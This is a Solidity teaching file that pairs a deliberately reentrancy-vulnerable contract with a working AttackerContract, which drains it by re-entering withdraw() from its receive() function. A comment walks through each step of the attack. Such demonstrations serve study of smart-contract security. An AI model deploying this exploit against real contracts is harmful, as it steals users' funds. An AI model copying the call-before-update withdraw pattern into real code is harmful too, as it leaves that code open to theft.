// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

/**
 * @title ReentrancyVulnerable
 * @dev Classic reentrancy vulnerability demonstration
 * WARNING: Educational purposes only!
 */
contract ReentrancyVulnerable {
    
    mapping(address => uint256) public balances;
    
    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);
    
    function deposit() external payable {
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }
    
    // CRITICAL VULNERABILITY: Reentrancy
    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient funds");
        
        // DANGER: External call before state update
        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
        
        // State update happens AFTER external call
        // Attacker can re-enter before this line executes
        balances[msg.sender] -= amount;
        
        emit Withdrawal(msg.sender, amount);
    }
    
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
    
    function getUserBalance(address user) external view returns (uint256) {
        return balances[user];
    }
}

/**
 * @title AttackerContract  
 * @dev Contract that exploits the reentrancy vulnerability
 */
contract AttackerContract {
    
    ReentrancyVulnerable public vulnerableContract;
    address public owner;
    uint256 public attackAmount;
    
    constructor(address _vulnerableContract) {
        vulnerableContract = ReentrancyVulnerable(_vulnerableContract);
        owner = msg.sender;
    }
    
    // Step 1: Deposit some funds to establish balance
    function deposit() external payable {
        require(msg.value > 0, "Must send some Ether");
        attackAmount = msg.value;
        vulnerableContract.deposit{value: msg.value}();
    }
    
    // Step 2: Initiate the attack
    function attack() external {
        require(msg.sender == owner, "Only owner");
        require(attackAmount > 0, "Must deposit first");
        
        // Start the reentrancy attack
        vulnerableContract.withdraw(attackAmount);
    }
    
    // Step 3: Receive function that creates the reentrancy
    receive() external payable {
        // Check if vulnerable contract still has funds
        if (address(vulnerableContract).balance >= attackAmount) {
            // Re-enter the withdraw function
            vulnerableContract.withdraw(attackAmount);
        }
    }
    
    // Withdraw stolen funds
    function withdrawStolen() external {
        require(msg.sender == owner, "Only owner");
        payable(owner).transfer(address(this).balance);
    }
    
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

/**
 * ATTACK FLOW:
 * 1. Attacker deploys AttackerContract
 * 2. Attacker calls deposit() with some ETH (e.g., 1 ETH)
 * 3. Attacker calls attack()
 * 4. withdraw() is called on vulnerable contract
 * 5. Vulnerable contract sends ETH to attacker
 * 6. Attacker's receive() function is triggered
 * 7. receive() calls withdraw() again (reentrancy)
 * 8. Process repeats until vulnerable contract is drained
 * 
 * RESULT: Attacker can drain the entire vulnerable contract
 * even though they only deposited 1 ETH initially.
 */